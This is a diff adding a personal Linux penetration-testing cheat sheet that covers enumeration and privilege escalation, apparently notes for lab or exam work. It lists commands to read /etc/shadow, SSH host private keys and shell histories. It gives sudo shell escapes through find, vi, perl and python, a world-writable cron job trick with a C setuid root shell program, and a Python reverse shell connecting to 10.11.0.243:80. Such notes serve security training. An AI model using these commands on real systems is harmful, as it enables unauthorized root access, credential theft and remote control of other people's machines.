@@ -1,0 +1,364 @@
+
+
+!!!!!=====Linux Initial Information Gathering=====!!!!!!
+
+!!==== Operating SYSTEM
+
+##=== Scripted approach
+using LinEnum.sh
+from /opt/LinEnum
+./linenum.sh -t   //for thorough scan
+
+
+
+
+##=== Finding a directory with write access e.g. for the script above
+find / -perm -o+w -type d 2>/dev/null
+
+##=== Finding file containing string
+grep -rnw '/' -e 'password'
+
+
+
+
+
+=== Which distribution?
+cat /etc/issue
+cat /etc/*-release
+cat /etc/lsb-release          #debian
+lsb_release -a (Debian based OSs)
+cat /etc/redhat-release       #redhat
+
+=== Which kernel?
+cat /proc/version
+uname -a
+
+=== Architecture
+uname -i
+
+=== Who we are? Where we are?
+id                      # "sudo" group in Debian based OS is "wheel" in CentOS/RedHat"
+whoami
+pwd
+
+=== User enumeration
+cat /etc/passwd
+grep -vE "nologin|false" /etc/passwd
+
+=== List super users
+grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'
+awk -F: '($3 == "0") {print}' /etc/passwd
+cat /etc/sudoers
+sudo -l
+
+=== Environment variables
+cat /etc/profile
+cat /etc/bashrc
+cat ~/.bash_profile
+cat ~/.bashrc
+cat ~/.bash_logout
+
+=== Printer
+lpstat -a
+
+=== Any interesting in home directories?
+ls -ahlR /root/
+ls -ahlR /home/
+
+=== Sensible files
+cat /etc/passwd
+cat /etc/group
+cat /etc/shadow
+ls -alh /var/mail/
+
+=== Standard stored password files:
+cat /var/apache2/config.inc
+cat /var/lib/mysql/mysql/user.MYD
+cat /root/anaconda-ks.cfg
+
+=== Are there any clear text passwords?
+cat ~/.bash_history
+cat ~/.nano_history
+cat ~/.atftp_history
+cat ~/.mysql_history
+cat ~/.php_history
+
+=== What user information can be found?
+cat ~/.bashrc
+cat ~/.profile
+cat /var/mail/root
+cat /var/spool/mail/root
+
+=== Able to reconfigure a service?
+ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
+ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
+ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
+ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other
+find /etc/ -readable -type f 2>/dev/null               # Anyone
+find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
+
+=== Anyting interesting in var?
+ls -alh /var/log
+ls -alh /var/mail
+ls -alh /var/spool
+ls -alh /var/spool/lpd
+ls -alh /var/lib/pgsql
+ls -alh /var/lib/mysql
+cat /var/lib/dhcp3/dhclient.leases
+
+=== Any web service / database setting files with sensible information?
+ls -alhR /var/www/
+ls -alhR /srv/www/htdocs/
+ls -alhR /usr/local/www/apache22/data/
+ls -alhR /opt/lampp/htdocs/
+ls -alhR /var/www/html/
+
+=== Finding common configuration files e.g. in the web dir
+find /path/to/folder -iname '*config*' -o -iname '*setting*'
+###Typical web roots: "/var/www/", "/var/www/html/", "/srv/www/", "/home/public_html/",
+###or use Apache configuration in: "/etc/apache2/", "/etc/httpd/"
+###In the Apache folder use the following command to find the directory
+grep -Ri DocumentRoot .
+
+=== Anything interesting in the logs?
+cat /etc/httpd/logs/access_log
+cat /etc/httpd/logs/access.log
+cat /etc/httpd/logs/error_log
+cat /etc/httpd/logs/error.log
+cat /var/log/apache2/access_log
+cat /var/log/apache2/access.log
+cat /var/log/apache2/error_log
+cat /var/log/apache2/error.log
+cat /var/log/apache/access_log
+cat /var/log/apache/access.log
+cat /var/log/auth.log
+cat /var/log/chttp.log
+cat /var/log/cups/error_log
+cat /var/log/dpkg.log
+cat /var/log/faillog
+cat /var/log/httpd/access_log
+cat /var/log/httpd/access.log
+cat /var/log/httpd/error_log
+cat /var/log/httpd/error.log
+cat /var/log/lastlog
+cat /var/log/lighttpd/access.log
+cat /var/log/lighttpd/error.log
+cat /var/log/lighttpd/lighttpd.access.log
+cat /var/log/lighttpd/lighttpd.error.log
+cat /var/log/messages
+cat /var/log/secure
+cat /var/log/syslog
+cat /var/log/wtmp
+cat /var/log/xferlog
+cat /var/log/yum.log
+cat /var/run/utmp
+cat /var/webmin/miniserv.log
+cat /var/www/logs/access_log
+cat /var/www/logs/access.log
+ls -alh /var/lib/dhcp3/
+ls -alh /var/log/postgresql/
+ls -alh /var/log/proftpd/
+ls -alh /var/log/samba/
+
+=== Finding files containing string
+grep -rnw '/path/' -e 'searchstring'
+grep -rnw '/' -e 'password'
+
+=== Finding SUID executable files
+find / -perm -u=s -type f 2>/dev/null
+
+=== Print world writeable files
+find / -perm -o+w -type f 2>/dev/null
+
+=== SSH configurartion
+grep -v '^#' /etc/ssh/sshd_config | uniq
+
+=== SSH keys
+cat /etc/ssh/ssh_config
+cat /etc/ssh/sshd_config
+cat /etc/ssh/ssh_host_dsa_key.pub
+cat /etc/ssh/ssh_host_dsa_key
+cat /etc/ssh/ssh_host_rsa_key.pub
+cat /etc/ssh/ssh_host_rsa_key
+cat /etc/ssh/ssh_host_key.pub
+cat /etc/ssh/ssh_host_key
+
+=== Any advanced file permissions?
+find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
+find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
+find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
+
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null                                                   # SGID or SUID
+for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
+
+###find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+
+=== Any problem files
+find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
+find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
+
+=== Finding development tools for exploit code
+find / -name perl*
+find / -name python*
+find / -name gcc*
+find / -name cc
+
+=== Potential file uploads:
+find / -name wget
+find / -name nc*
+find / -name netcat*
+find / -name tftp*
+find / -name ftp
+
+
+
+!!=== Applications and services
+ps aux
+ps -ef
+top
+cat /etc/services
+
+=== What is installed?
+dpkg -l (Debian based OSs (not maually installed applications))
+rpm -qa (CentOS / openSUSE (not maually installed applications))
+### ""/var/", "/opt/", "/usr/local/src" and "/usr/src/" common places for manual installed apps
+### else users home folder's or mounted external media etc! - end users do crazy things
+
+=== Kernel:
+uname -a
+
+=== Network connections
+netstat -antup
+
+
+
+!!==== Bringing it all together
+Then using this information, we can help answer the following:
+
+What user files do we have access to?
+What configurations do we have access to?
+Any incorrect file permissions?
+What programs are custom? Any SUID? SGID?
+What's scheduled to run?
+Any hardcoded credentials? Where are credentials kept?
+
+
+
+
+
+
+
+
+
+
+
+
+!!!!====    Linux: Privilege escalation techniques     ====!!!!
+
+=== Finding Programs with Setuid:
+find <directory> -user root -perm -4000 -exec ls -ld {} \; >/tmp/gapingSecHole
+
+
+!!=== Commands allowed to execute as root
+sudo -l
+
+###If it is permitet to any executables:
+
+###We can run the particular command as SUDO.
+###These commands will run as root when run with SUDO
+###If we can somehow escape to the shell through any of these commands, we can get root access.
+
+###if SUDO rights are given to any of the programming language compiler, interpreter and editors you can exploit it
+
+###This technique can also be applied to find, vi, more, less, python, perl, ruby, gdb and others.
+###e.g.
+sudo find /home -exec sh -i \;      or
+sudo find /etc -exec bash -i \;
+
+sudo vi -> :shell
+
+sudo less -> can jump to vi -> :shell
+                                ~37min in the “funky in here linux privilege escalation”-YoutubeVideo
+sudo more (long file)  !bash
+                                (!?    in more for help)
+sudo perl
+exec “/bin/bash”;
+
+sudo ruby
+exec “/bin/bash”
+
+sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’
+
+sudo python
+import os
+os.system(‘/bin/bash’)
+
+
+
+
+!!=== Badly configured cron jobs
+
+=== Print Cronjob configurations
+ls -la /etc/cron.d
+ls -la /etc/cron.hourly
+ls -la /etc/cron.monthly
+ls -la /etc/cron.weeklycat
+cat /etc/crontab
+
+=== Check whether a cronjob is worlwriteable
+find / -perm -2 -type f 2>/dev/null | grep aCronJob
+
+=== Confirm that the found file is world writeable and has root permissions
+ls -la /path/to/cron/job-file.sh
+
+###If a cron job is world writable: Any command we write/append in this cronjob would be executed as ‘root’ if it has root permissions.
+
+###write a C file in /tmp directory and compile it:
+int main(void){
+setgid(0);
+setuid(0);
+execl("/bin/sh", "sh", 0);
+}
+
+=== compile
+gcc filename.c outputname
+
+=== change the executable’s owner and group as root. It will also set the SUID bit.
+echo “chown root:root /tmp/outputname; chmod u+s /tmp/outputname;”>/path/to/cron/job-file.sh
+
+=== When cronjob was run and cjob-file.sh got execute with root privilege.
+/tmp/outputname
+### spawns a root shell
+
+
+
+
+!!=== Using process capabilities (files with POSIX cap set)
+
+getcap -r / 2>/dev/null
+
+look for files having ep capability
+
+
+
+
+
+
+
+
+!!=== Getting a PTY shell from an ordinary shell
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+Python reverse shell
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.243",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+!!=== Interacting with mysql
+### if credentials are found during the enumeration process you can try
+mysql -uroot -Passw0rdFound -e 'show databases;'
+
+
+
+!!=== Looking for Nmap on the machine
+It is good practice to use a local machine for a nmap scan rather than scanning the network via vpn;
+Therefore use Nmap on a target host
